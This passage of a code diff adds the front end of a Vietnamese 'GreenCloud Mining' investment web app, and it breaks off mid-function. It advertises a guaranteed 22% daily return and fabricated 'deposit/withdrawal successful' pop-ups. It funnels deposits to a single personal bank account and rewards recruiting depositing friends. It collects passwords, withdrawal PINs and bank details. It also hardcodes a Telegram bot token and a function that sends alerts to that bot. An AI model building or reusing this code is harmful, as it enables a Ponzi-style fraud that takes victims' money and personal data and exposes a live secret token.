+    <nav class="bottom-nav">
+      <div class="nav-item active" onclick="window.switchNavTab('tabHome', this)">
+        <span class="nav-icon">🏠</span>
+        <span>Trang Chủ</span>
+      </div>
+      <div class="nav-item" onclick="window.switchNavTab('tabPackages', this)">
+        <span class="nav-icon">⚡</span>
+        <span>Gói Đầu Tư</span>
+      </div>
+      <div class="nav-item" onclick="window.switchNavTab('tabActivities', this)">
+        <span class="nav-icon">🎯</span>
+        <span>Hoạt Động</span>
+      </div>
+      <div class="nav-item" onclick="window.switchNavTab('tabTeam', this)">
+        <span class="nav-icon">👥</span>
+        <span>Đội Nhóm</span>
+      </div>
+      <div class="nav-item" onclick="window.switchNavTab('tabProfile', this)">
+        <span class="nav-icon">👤</span>
+        <span>Tôi</span>
+      </div>
+    </nav>
+
+  </div>
+
+  <!-- DISTINCT TOASTS: NẠP VÀ RÚT HOÀN TOÀN KHÁC NHAU -->
+  <div class="distinct-toast deposit" id="toastDeposit">
+    <div class="toast-orb">📥</div>
+    <div>
+      <div style="font-weight:800; color:#34d399; font-size:11.5px;">NẠP TIỀN THÀNH CÔNG</div>
+      <div style="color:#cbd5e1; font-size:11px;" id="toastDepositMsg">Thợ đào 098****213 vừa nạp gói Khởi Động 76.000 đ!</div>
+      <div style="color:#64748b; font-size:9.5px; margin-top:2px;">MB Bank 0829594887 &bull; Khớp tự động</div>
+    </div>
+  </div>
+
+  <div class="distinct-toast withdraw" id="toastWithdraw">
+    <div class="toast-orb">📤</div>
+    <div>
+      <div style="font-weight:800; color:#fbbf24; font-size:11.5px;">RÚT TIỀN VỀ NGÂN HÀNG</div>
+      <div style="color:#cbd5e1; font-size:11px;" id="toastWithdrawMsg">Thợ đào 097****641 vừa rút 330.000 đ về Vietcombank!</div>
+      <div style="color:#64748b; font-size:9.5px; margin-top:2px;">Trạng thái: Đã chuyển khoản thành công</div>
+    </div>
+  </div>
+
+  <!-- System Pop Toast -->
+  <div id="sysToast">Thông báo</div>
+
+  <!-- ==================== MODALS ==================== -->
+
+  <!-- Modal Đăng Ký / Đăng Nhập -->
+  <div class="modal-backdrop" id="modalAuth">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title" id="authTitle">ĐĂNG KÝ TÀI KHOẢN MỚI</div>
+        <button class="modal-close" onclick="window.closeModal('modalAuth')">✕</button>
+      </div>
+
+      <div style="display:flex; gap:6px; margin-bottom:12px;">
+        <button class="btn btn-secondary btn-sm" id="authTabReg" style="flex:1; border-color:#10b981; color:#34d399;" onclick="window.setAuthMode('register')">Đăng Ký</button>
+        <button class="btn btn-secondary btn-sm" id="authTabLog" style="flex:1;" onclick="window.setAuthMode('login')">Đăng Nhập</button>
+      </div>
+
+      <div class="input-group" id="groupFullName">
+        <label class="input-label">HỌ VÀ TÊN THẬT (CHỦ TÀI KHOẢN)</label>
+        <input type="text" class="input-control" id="authFullName" placeholder="Ví dụ: NGUYỄN VĂN A">
+      </div>
+      <div class="input-group">
+        <label class="input-label">SĐT / TÊN ĐĂNG NHẬP</label>
+        <input type="text" class="input-control" id="authUsername" placeholder="Ví dụ: 0988776655">
+      </div>
+      <div class="input-group">
+        <label class="input-label">MẬT KHẨU</label>
+        <input type="password" class="input-control" id="authPassword" placeholder="Tối thiểu 6 ký tự">
+      </div>
+      <div class="input-group" id="groupConfirmPass">
+        <label class="input-label">XÁC NHẬN LẠI MẬT KHẨU</label>
+        <input type="password" class="input-control" id="authConfirmPass" placeholder="Nhập lại mật khẩu">
+      </div>
+      <div class="input-group" id="groupRefCode">
+        <div style="display:flex; justify-content:space-between;">
+          <label class="input-label">MÃ GIỚI THIỆU (NẾU CÓ)</label>
+          <span id="refBadge" style="display:none; color:#38bdf8; font-size:10px; font-weight:700;">🔒 Khóa theo liên kết</span>
+        </div>
+        <input type="text" class="input-control mono" id="authRefCode" placeholder="Mã người giới thiệu">
+      </div>
+      <div class="input-group" id="groupCaptcha">
+        <label class="input-label">MÃ CAPTCHA BẢO MẬT</label>
+        <div style="display:flex; gap:6px; align-items:center;">
+          <input type="text" class="input-control mono" id="authCaptchaInput" maxlength="4" placeholder="Nhập 4 số">
+          <div class="mono" id="captchaBox" style="background:#020617; border:1px solid #10b981; color:#34d399; font-weight:900; font-size:15px; letter-spacing:3px; padding:7px 12px; border-radius:8px;">8492</div>
+          <button type="button" class="btn btn-secondary btn-sm" onclick="window.genCaptcha()">🔄</button>
+        </div>
+      </div>
+      <div id="groupTerms" style="display:flex; align-items:center; gap:6px; margin-bottom:12px; font-size:11px; color:#cbd5e1;">
+        <input type="checkbox" id="authAgree" checked style="accent-color:#10b981;">
+        <label for="authAgree">Tôi đồng ý với Quy định khai thác GreenCloud</label>
+      </div>
+
+      <button class="btn btn-primary" id="btnAuthSubmit" onclick="window.submitAuth()">Kích Hoạt Tài Khoản & Nhận 20K</button>
+    </div>
+  </div>
+
+  <!-- Modal 1: Nạp Gói Đào (GC...) Tự Động MB Bank -->
+  <div class="modal-backdrop" id="modalDeposit">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">NẠP TIỀN KÍCH HOẠT GÓI ĐÀO (22%/NGÀY)</div>
+        <button class="modal-close" onclick="window.closeModal('modalDeposit')">✕</button>
+      </div>
+      <p style="font-size:11px; color:#94a3b8; margin-bottom:10px;">
+        Chọn mốc gói cần nạp. Hệ thống sẽ quét tự động biến động số dư MB Bank 24/7 để kích hoạt ngay:
+      </p>
+
+      <div style="display:flex; flex-direction:column; gap:6px; margin-bottom:12px;">
+        <button class="btn btn-secondary" onclick="window.pickDepositTier('76k')">Gói Khởi Động - 76.000 đ (Lãi 16.720 đ/ngày)</button>
+        <button class="btn btn-secondary" onclick="window.pickDepositTier('104k')">Gói Tiêu Chuẩn - 104.000 đ (Lãi 22.880 đ/ngày)</button>
+        <button class="btn btn-secondary" onclick="window.pickDepositTier('208k')">Gói Nâng Cao - 208.000 đ (Lãi 45.760 đ/ngày)</button>
+        <button class="btn btn-secondary" onclick="window.pickDepositTier('416k')">Gói Chuyên Nghiệp - 416.000 đ (Lãi 91.520 đ/ngày)</button>
+        <button class="btn btn-secondary" onclick="window.pickDepositTier('832k')">Gói Trang Trại - 832.000 đ (Lãi 183.040 đ/ngày)</button>
+        <button class="btn btn-secondary" onclick="window.pickDepositTier('1500k')">Gói Cá Voi VIP - 1.500.000 đ (Lãi 330.000 đ/ngày)</button>
+      </div>
+
+      <!-- Preview QR -->
+      <div id="depositPreviewBox" style="display:none; background:#020617; border:1px solid #10b981; border-radius:12px; padding:12px;">
+        <div style="font-size:12px; font-weight:700; color:#10b981;" id="depositTierName">Gói Đã Chọn</div>
+        <div class="mono" style="font-size:17px; font-weight:800; color:#fff;" id="depositTierCost">0 đ</div>
+
+        <!-- VietQR Dynamic Image -->
+        <div style="text-align:center; background:#fff; padding:10px; border-radius:10px; margin:10px 0;">
+          <img id="depositQrImg" src="" alt="VietQR MB Bank" style="width:160px; height:160px; display:block; margin:0 auto;">
+          <div style="font-size:10.5px; color:#334155; font-weight:700; margin-top:4px;">Quét mã QR bằng App Ngân Hàng (Tự điền 100%)</div>
+        </div>
+
+        <div style="font-size:11.5px; display:flex; flex-direction:column; gap:4px;">
+          <div style="display:flex; justify-content:space-between;">
+            <span style="color:#94a3b8;">Ngân hàng:</span>
+            <b>MB Bank (Quân Đội)</b>
+          </div>
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <span style="color:#94a3b8;">Số tài khoản:</span>
+            <span style="display:flex; gap:6px; align-items:center;">
+              <b class="mono" style="color:#38bdf8;">0829594887</b>
+              <button class="btn btn-secondary btn-sm" onclick="window.copyText('0829594887')">Copy</button>
+            </span>
+          </div>
+          <div style="display:flex; justify-content:space-between;">
+            <span style="color:#94a3b8;">Chủ tài khoản:</span>
+            <b>DANG HIEU THANG</b>
+          </div>
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-top:2px;">
+            <span style="color:#94a3b8;">Nội dung CK:</span>
+            <span style="display:flex; gap:6px; align-items:center;">
+              <b class="mono" id="depositCodeText" style="color:#10b981; background:#0b1120; padding:2px 6px; border-radius:4px;">GC...</b>
+              <button class="btn btn-secondary btn-sm" onclick="window.copyDepositCode()">Copy</button>
+            </span>
+          </div>
+        </div>
+
+        <!-- Radar Live Status Indicator -->
+        <div style="background:rgba(16, 185, 129, 0.1); border:1px dashed #10b981; border-radius:8px; padding:10px; text-align:center; margin-top:10px;">
+          <div style="color:#34d399; font-weight:700; font-size:11.5px; display:flex; align-items:center; justify-content:center; gap:5px;">
+            <span class="status-dot"></span> HỆ THỐNG ĐANG QUÉT NẠP TỰ ĐỘNG
+          </div>
+          <div style="font-size:10px; color:#94a3b8; margin-top:2px;">Tiền sẽ tự động cộng sau 2 - 5 giây khi chuyển thành công (Không cần ấn xác nhận).</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal 2: Nạp Hũ Nâng Cấp (NC...) -->
+  <div class="modal-backdrop" id="modalUpgradeDeposit">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">💠 NẠP TIỀN VÀO HŨ NÂNG CẤP</div>
+        <button class="modal-close" onclick="window.closeModal('modalUpgradeDeposit')">✕</button>
+      </div>
+      <p style="font-size:11px; color:#94a3b8; margin-bottom:8px;">
+        Hũ tiền này dành riêng để mua phụ kiện và ép xung. Nhập số tiền tùy ý:
+      </p>
+
+      <div class="input-group">
+        <label class="input-label">SỐ TIỀN MUỐN NẠP (VNĐ)</label>
+        <input type="number" class="input-control mono" id="upgradeAmountInput" placeholder="Ví dụ: 50000" oninput="window.updateUpgradeQr()">
+      </div>
+
+      <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:6px; margin-bottom:12px;">
+        <button class="btn btn-secondary btn-sm" onclick="window.setUpgradeVal(10000)">10.000 đ</button>
+        <button class="btn btn-secondary btn-sm" onclick="window.setUpgradeVal(25000)">25.000 đ</button>
+        <button class="btn btn-secondary btn-sm" onclick="window.setUpgradeVal(50000)">50.000 đ</button>
+        <button class="btn btn-secondary btn-sm" onclick="window.setUpgradeVal(100000)">100.000 đ</button>
+        <button class="btn btn-secondary btn-sm" onclick="window.setUpgradeVal(200000)">200.000 đ</button>
+        <button class="btn btn-secondary btn-sm" onclick="window.setUpgradeVal(500000)">500.000 đ</button>
+      </div>
+
+      <div style="background:#020617; border:1px solid #0284c7; border-radius:12px; padding:12px;">
+        <div style="text-align:center; background:#fff; padding:10px; border-radius:10px; margin-bottom:10px;">
+          <img id="upgradeQrImg" src="" alt="VietQR Hũ" style="width:150px; height:150px; display:block; margin:0 auto;">
+          <div style="font-size:10px; color:#334155; font-weight:700; margin-top:4px;">Quét mã để nạp thẳng vào Hũ Nâng Cấp</div>
+        </div>
+
+        <div style="font-size:11.5px; display:flex; flex-direction:column; gap:4px;">
+          <div style="display:flex; justify-content:space-between;">
+            <span style="color:#94a3b8;">Ngân hàng:</span>
+            <b>MB Bank (Quân Đội)</b>
+          </div>
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <span style="color:#94a3b8;">Số tài khoản:</span>
+            <span style="display:flex; gap:6px; align-items:center;">
+              <b class="mono" style="color:#38bdf8;">0829594887</b>
+              <button class="btn btn-secondary btn-sm" onclick="window.copyText('0829594887')">Copy</button>
+            </span>
+          </div>
+          <div style="display:flex; justify-content:space-between;">
+            <span style="color:#94a3b8;">Chủ tài khoản:</span>
+            <b>DANG HIEU THANG</b>
+          </div>
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <span style="color:#94a3b8;">Nội dung CK riêng:</span>
+            <span style="display:flex; gap:6px; align-items:center;">
+              <b class="mono" id="upgradeCodeText" style="color:#38bdf8; background:#0b1120; padding:2px 6px; border-radius:4px;">NC...</b>
+              <button class="btn btn-secondary btn-sm" onclick="window.copyUpgradeCode()">Copy</button>
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal 3: Rút Hũ Nâng Cấp Về Ví Chính -->
+  <div class="modal-backdrop" id="modalTransferUpgrade">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">🔄 RÚT TIỀN TỪ HŨ VỀ VÍ CHÍNH</div>
+        <button class="modal-close" onclick="window.closeModal('modalTransferUpgrade')">✕</button>
+      </div>
+
+      <div id="transferNotice" style="padding:10px; border-radius:8px; margin-bottom:10px; font-size:11px;"></div>
+
+      <div style="background:#020617; border:1px solid #1e293b; border-radius:10px; padding:10px; margin-bottom:10px; font-size:11.5px;">
+        <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
+          <span style="color:#94a3b8;">Số dư Hũ hiện tại:</span>
+          <b class="mono" style="color:#38bdf8;" id="transferMaxBalance">0 đ</b>
+        </div>
+        <div style="display:flex; justify-content:space-between;">
+          <span style="color:#94a3b8;">Ví Chính sau khi chuyển:</span>
+          <b class="mono" style="color:#10b981;" id="transferTargetPreview">0 đ</b>
+        </div>
+      </div>
+
+      <div class="input-group">
+        <label class="input-label">SỐ TIỀN MUỐN RÚT VỀ VÍ (VNĐ)</label>
+        <div style="display:flex; gap:6px;">
+          <input type="number" class="input-control mono" id="transferAmountInput" placeholder="Ví dụ: 20000" oninput="window.calcTransferTarget()">
+          <button class="btn btn-secondary btn-sm" onclick="window.setTransferMax()">Rút Hết</button>
+        </div>
+      </div>
+
+      <button class="btn btn-primary" id="btnConfirmTransfer" onclick="window.confirmTransfer()">Xác Nhận Rút Về Ví Chính</button>
+    </div>
+  </div>
+
+  <!-- Modal 4: Rút Tiền Về Ngân Hàng (AI BOT 24/7) -->
+  <div class="modal-backdrop" id="modalWithdraw">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">RÚT TIỀN VỀ TÀI KHOẢN NGÂN HÀNG (AI BOT)</div>
+        <button class="modal-close" onclick="window.closeModal('modalWithdraw')">✕</button>
+      </div>
+
+      <div id="withdrawNotice" style="padding:10px; border-radius:8px; margin-bottom:10px; font-size:11px;"></div>
+
+      <div class="input-group">
+        <label class="input-label">CHỌN NGÂN HÀNG THỤ HƯỞNG</label>
+        <select class="input-control" id="withdrawBankSelect">
+          <option value="MBBank">MBBank (Quân Đội)</option>
+          <option value="Vietcombank">Vietcombank</option>
+          <option value="Techcombank">Techcombank</option>
+          <option value="VietinBank">VietinBank</option>
+          <option value="ACB">ACB Bank</option>
+          <option value="MoMo">Ví MoMo</option>
+        </select>
+      </div>
+
+      <div class="input-group">
+        <label class="input-label">SỐ TÀI KHOẢN NGÂN HÀNG</label>
+        <input type="text" class="input-control mono" id="withdrawAccNum" placeholder="Nhập số tài khoản">
+      </div>
+
+      <div class="input-group">
+        <label class="input-label">TÊN CHỦ TÀI KHOẢN (IN HOA)</label>
+        <input type="text" class="input-control" id="withdrawAccHolder" placeholder="Ví dụ: NGUYEN VAN A">
+      </div>
+
+      <div class="input-group">
+        <label class="input-label">SỐ TIỀN RÚT (TỐI THIỂU 10.000 đ)</label>
+        <input type="number" class="input-control mono" id="withdrawAmountVal" placeholder="Ví dụ: 100000">
+      </div>
+
+      <div class="input-group" style="background:#020617; border:1px solid #334155; padding:8px 10px; border-radius:8px;">
+        <label class="input-label" style="color:#fcd34d;">🔒 XÁC THỰC MÃ PIN RÚT TIỀN (6 SỐ)</label>
+        <input type="password" maxlength="6" class="input-control mono" id="withdrawPinInput" placeholder="Nhập 6 chữ số PIN">
+      </div>
+
+      <button class="btn btn-primary" id="btnSubmitWithdraw" onclick="window.submitWithdraw()">Tạo Lệnh Rút Tiền</button>
+    </div>
+  </div>
+
+  <!-- Modal Chi Tiết F1 -->
+  <div class="modal-backdrop" id="modalF1List">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">DANH SÁCH BẠN BÈ F1</div>
+        <button class="modal-close" onclick="window.closeModal('modalF1List')">✕</button>
+      </div>
+      <div id="f1ListContainer" style="display:flex; flex-direction:column; gap:8px; max-height:280px; overflow-y:auto;">
+        <div style="font-size:11px; color:#64748b; text-align:center; padding:16px;">Chưa có thành viên tuyến dưới. Hãy chia sẻ liên kết mời của bạn!</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal Cài Đặt Ngân Hàng Mặc Định -->
+  <div class="modal-backdrop" id="modalBankSettings">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">🏦 THIẾT LẬP NGÂN HÀNG MẶC ĐỊNH</div>
+        <button class="modal-close" onclick="window.closeModal('modalBankSettings')">✕</button>
+      </div>
+
+      <div class="input-group">
+        <label class="input-label">NGÂN HÀNG</label>
+        <select class="input-control" id="setBankName">
+          <option value="MBBank">MBBank (Quân Đội)</option>
+          <option value="Vietcombank">Vietcombank</option>
+          <option value="Techcombank">Techcombank</option>
+          <option value="VietinBank">VietinBank</option>
+          <option value="ACB">ACB Bank</option>
+          <option value="MoMo">Ví MoMo</option>
+        </select>
+      </div>
+      <div class="input-group">
+        <label class="input-label">SỐ TÀI KHOẢN</label>
+        <input type="text" class="input-control mono" id="setBankAcc" placeholder="Nhập số tài khoản">
+      </div>
+      <div class="input-group">
+        <label class="input-label">TÊN CHỦ TÀI KHOẢN (IN HOA)</label>
+        <input type="text" class="input-control" id="setBankHolder" placeholder="Ví dụ: DANG HIEU THANG">
+      </div>
+
+      <button class="btn btn-primary" onclick="window.saveBankConfig()">Lưu Thông Tin Ngân Hàng</button>
+    </div>
+  </div>
+
+  <!-- Modal Đổi Mã PIN -->
+  <div class="modal-backdrop" id="modalSetPin">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">🔒 THIẾT LẬP MÃ PIN RÚT TIỀN (6 SỐ)</div>
+        <button class="modal-close" onclick="window.closeModal('modalSetPin')">✕</button>
+      </div>
+      <p style="font-size:11px; color:#94a3b8; margin-bottom:10px;">Mã PIN giúp bảo vệ số dư khi rút tiền về tài khoản ngân hàng:</p>
+
+      <div class="input-group">
+        <label class="input-label">NHẬP MÃ PIN MỚI (6 SỐ)</label>
+        <input type="password" maxlength="6" class="input-control mono" id="newPin1" placeholder="Ví dụ: 123456">
+      </div>
+      <div class="input-group">
+        <label class="input-label">XÁC NHẬN LẠI PIN</label>
+        <input type="password" maxlength="6" class="input-control mono" id="newPin2" placeholder="Nhập lại 6 số">
+      </div>
+
+      <button class="btn btn-primary" onclick="window.savePinCode()">Lưu Mã PIN</button>
+    </div>
+  </div>
+
+  <!-- Modal Ép Xung -->
+  <div class="modal-backdrop" id="modalOverclock">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">🚀 ÉP XUNG PHẦN CỨNG (OVERCLOCK)</div>
+        <button class="modal-close" onclick="window.closeModal('modalOverclock')">✕</button>
+      </div>
+      <div style="display:flex; flex-direction:column; gap:8px;">
+        <div style="background:#020617; border:1px solid #1e293b; border-radius:8px; padding:10px; display:flex; justify-content:space-between; align-items:center;">
+          <div>
+            <div style="font-weight:700; color:#fff;">Quạt Ly Tâm (+2%)</div>
+            <div style="font-size:10.5px; color:#38bdf8;">Giá: 15.000 đ (Trừ Hũ)</div>
+          </div>
+          <button class="btn btn-blue btn-sm" onclick="window.buyOverclock(15000, 2)">Nâng Cấp</button>
+        </div>
+        <div style="background:#020617; border:1px solid #1e293b; border-radius:8px; padding:10px; display:flex; justify-content:space-between; align-items:center;">
+          <div>
+            <div style="font-weight:700; color:#fff;">Keo Kim Cương (+5%)</div>
+            <div style="font-size:10.5px; color:#38bdf8;">Giá: 35.000 đ (Trừ Hũ)</div>
+          </div>
+          <button class="btn btn-blue btn-sm" onclick="window.buyOverclock(35000, 5)">Nâng Cấp</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal Quỹ Khóa -->
+  <div class="modal-backdrop" id="modalVault">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">🏦 QUỸ TIẾT KIỆM KỲ HẠN</div>
+        <button class="modal-close" onclick="window.closeModal('modalVault')">✕</button>
+      </div>
+      <div style="background:#020617; border:1px solid #1e293b; border-radius:10px; padding:12px;">
+        <div style="display:flex; justify-content:space-between; font-weight:700; color:#fff;">
+          <span>Gói Tiết Kiệm 7 Ngày</span>
+          <span style="color:#10b981;">+7% Lợi Tức</span>
+        </div>
+        <p style="font-size:11px; color:#64748b; margin:4px 0 8px 0;">Khóa 50.000 đ nhận lại 53.500 đ khi đáo hạn</p>
+        <button class="btn btn-secondary btn-sm" onclick="window.depositVault(50000)">Gửi 50.000 đ</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal Bảo Hiểm -->
+  <div class="modal-backdrop" id="modalInsurance">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">🛡️ BẢO HIỂM HOÀN VỐN CLOUD SHIELD</div>
+        <button class="modal-close" onclick="window.closeModal('modalInsurance')">✕</button>
+      </div>
+      <p style="font-size:11.5px; color:#cbd5e1; line-height:1.5;">Cam kết bảo vệ 100% chi phí các gói đã mua với cam kết tỷ lệ hoàn vốn 22%/ngày.</p>
+      <button class="btn btn-primary" style="margin-top:12px;" onclick="window.closeModal('modalInsurance'); window.showToast('✓ Hợp đồng bảo hiểm đang có hiệu lực tự động!');">Đã Hiểu</button>
+    </div>
+  </div>
+
+  <!-- Modal Chi Tiết Gói -->
+  <div class="modal-backdrop" id="modalPackageDetail">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title" id="pkgModalTitle">CHI TIẾT MÁY ĐÀO</div>
+        <button class="modal-close" onclick="window.closeModal('modalPackageDetail')">✕</button>
+      </div>
+      <div id="pkgModalContent" style="font-size:11.5px; color:#cbd5e1; line-height:1.5;"></div>
+    </div>
+  </div>
+
+  <!-- Modal Lịch Sử -->
+  <div class="modal-backdrop" id="modalHistory">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title" id="historyTitle">LỊCH SỬ GIAO DỊCH</div>
+        <button class="modal-close" onclick="window.closeModal('modalHistory')">✕</button>
+      </div>
+      <div id="historyListContainer" style="display:flex; flex-direction:column; gap:8px;"></div>
+    </div>
+  </div>
+
+  <!-- Modal Giới Thiệu -->
+  <div class="modal-backdrop" id="modalIntro">
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <div class="modal-title">GIỚI THIỆU GREENCLOUD MINING</div>
+        <button class="modal-close" onclick="window.closeModal('modalIntro')">✕</button>
+      </div>
+      <div style="font-size:12px; color:#cbd5e1; line-height:1.6;">
+        <p><b>GreenCloud Mining</b> là nền tảng khai thác Bitcoin điện toán đám mây thế hệ mới.</p>
+        <br>
+        <p>⚡ <b>Sinh lời theo giây:</b> Tỷ lệ hoàn trả 22%/ngày cho tất cả các gói, chia đều trả về ví từng giây 24/7 kể cả khi tắt mạng.</p>
+        <br>
+        <p>🏦 <b>MB Bank:</b> Số tài khoản <b>0829594887</b> (DANG HIEU THANG) hỗ trợ SePay tự động.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== LOGIC JAVASCRIPT HOÀN CHỈNH ==================== -->
+  <script>
+    /* ========================================================
+       CONFIG & USER STATE
+    ======================================================== */
+    const STORAGE_KEY = 'GREENCLOUD_USER_ACTIVE_V26';
+    const PHONE_DB_KEY = 'GREENCLOUD_REGISTERED_PHONES_V2';
+    const TELEGRAM_BOT_TOKEN = '9196510643:AAGzXlYNEeCxz_Pchrg7528VBkaB53sXpd4';
+    const TELEGRAM_CHAT_ID = '7865394196';
+
+    function sendTelegramAlert(text) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+      fetch(url).catch(e => console.log('Telegram err:', e));
+    }
+
+    const PACKAGES_CONFIG = {
+      free: {
+        id: 'free',
+        name: 'Gói Miễn Phí (Free)',
+        cost: 0,
+        dailyReturn: 400,
+        hw: 'CPU Cloud Server Share v1',
+        img: 'https://images.unsplash.com/photo-1591799264318-7e6ef8ddb7ea?w=700&auto=format&fit=crop&q=80',
+        desc: 'Gói tân thủ trải nghiệm, phân luồng CPU ảo chạy tác vụ băm cơ bản.'
+      },
+      '76k': {
+        id: '76k',
+        name: 'Gói Khởi Động 76K',
+        cost: 76000,
+        dailyReturn: 16720,
+        hw: 'NVIDIA RTX 3060 Dedicated Rig',
+        img: 'https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=700&auto=format&fit=crop&q=80',
+        desc: 'Trang bị 01 card đồ họa NVIDIA RTX chuyên dụng, tỷ lệ hoàn vốn 22%/ngày.'
+      },
+      '104k': {
+        id: '104k',
+        name: 'Gói Tiêu Chuẩn 104K',
+        cost: 104000,
+        dailyReturn: 22880,
+        hw: 'NVIDIA RTX 3080 Cloud Cluster',
+        img: 'https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=700&auto=format&fit=crop&q=80',
+        desc: 'Cụm GPU hiệu năng cao với tản nhiệt buồng hơi và đèn LED RGB (22%/ngày).'
+      },
+      '208k': {
+        id: '208k',
+        name: 'Gói Nâng Cao 208K',
+        cost: 208000,
+        dailyReturn: 45760,
+        hw: 'Dual RTX 4080 Mining Unit',
+        img: 'https://images.unsplash.com/photo-1518770660439-4636190af475?w=700&auto=format&fit=crop&q=80',
+        desc: 'Bộ đôi vi xử lý thế hệ mới gắn trên khung mở đa tầng tối ưu SHA-256 (22%/ngày).'
+      },
+      '416k': {
+        id: '416k',
+        name: 'Gói Chuyên Nghiệp 416K',
+        cost: 416000,
+        dailyReturn: 91520,
+        hw: 'Antminer S19 Pro 110TH/s Rack',
+        img: 'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=700&auto=format&fit=crop&q=80',
+        desc: 'Tủ Rack máy đào ASIC chuyên dụng Antminer chạy tại Datacenter Singapore (22%/ngày).'
+      },
+      '832k': {
+        id: '832k',
+        name: 'Gói Trang Trại 832K',
+        cost: 832000,
+        dailyReturn: 183040,
+        hw: 'Hydro ASIC Farm Container (4 Units)',
+        img: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=700&auto=format&fit=crop&q=80',
+        desc: 'Container làm mát bằng chất lỏng Hydro khép kín, hashrate đỉnh cao (22%/ngày).'
+      },
+      '1500k': {
+        id: '1500k',
+        name: 'Gói Cá Voi VIP 1.5M',
+        cost: 1500000,
+        dailyReturn: 330000,
+        hw: 'Supercomputer Cloud Mining Node VIP',
+        img: 'https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=700&auto=format&fit=crop&q=80',
+        desc: 'Nút mạng siêu máy tính VIP kết nối vệ tinh phân bổ block nhanh nhất (22%/ngày).'
+      }
+    };
+
+    const INVITE_TASKS = [
+      { id: 'inv_5', target: 5, reward: 10000, title: 'Mời 5 bạn bè nạp tiền' },
+      { id: 'inv_10', target: 10, reward: 20000, title: 'Mời 10 bạn bè nạp tiền' },
+      { id: 'inv_20', target: 20, reward: 40000, title: 'Mời 20 bạn bè nạp tiền' },
+      { id: 'inv_50', target: 50, reward: 100000, title: 'Mời 50 bạn bè nạp tiền' },
+      { id: 'inv_100', target: 100, reward: 300000, title: 'Mời 100 bạn bè nạp tiền' }
+    ];
+
+    let user = {
+      isLoggedIn: false,
+      fullName: '',
+      telegramId: '',
+      username: '',
+      password: '',
+      pin: '',
+      savedBank: {
+        bankName: '',
+        accountNum: '',
+        accountName: ''
+      },
+      balance: 0,
+      upgradeBalance: 0,
+      ownedPackages: { free: 0, '76k': 0, '104k': 0, '208k': 0, '416k': 0, '832k': 0, '1500k': 0 },
+      overclockPercent: 0,
+      autoCompound: false,
+      lastActiveTimestamp: 0,
+      lastDailyDate: '',
+      giftSpins: 0,
+      refF1Total: 0,
+      refF1Paid: 0,
+      completedTasks: [],
+      deposits: [],
+      upgradeDeposits: [],
+      withdrawals: [],
+      transfers: [],
+      refMembers: []
+    };
+
+    let audioCtx = null;
+    let isAudioOn = true;
+    let authMode = 'register';
+    let currentCaptcha = '8492';
+    let selectedTier = null;
+    let canvas = null;
+    let ctx = null;
+    let wavePoints = new Array(30).fill(40);
+    let lastTick = Date.now();
+    let isActionLocked = false;
+
+    /* ========================================================
+       MODAL & NAVIGATION UTILS (WINDOW BOUND)
+    ======================================================== */
+    window.openModal = function(id) {
+      const el = document.getElementById(id);
+      if (el) el.classList.add('show');
+    };
+
+    window.closeModal = function(id) {
+      const el = document.getElementById(id);
+      if (el) el.classList.remove('show');
+    };
+
+    window.switchNavTab = function(tabId, navElem) {
+      document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('active'));
+      document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+
+      const activeTab = document.getElementById(tabId);
+      if (activeTab) activeTab.classList.add('active');
+      if (navElem) navElem.classList.add('active');
+    };
+
+    window.showToast = function(msg) {
+      const t = document.getElementById('sysToast');
+      if (!t) return;
+      t.textContent = msg;
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 2600);
+    };
+
+    window.copyText = function(text) {
+      navigator.clipboard.writeText(text);
+      window.showToast('✓ Đã sao chép: ' + text);
+    };
+
+    window.playBeep = function(freq = 600, duration = 0.08) {
+      if (!isAudioOn) return;
+      try {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+        gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start();
+        osc.stop(audioCtx.currentTime + duration);
+      } catch (e) {}
+    };
+
+    window.toggleAudio = function() {
+      isAudioOn = !isAudioOn;
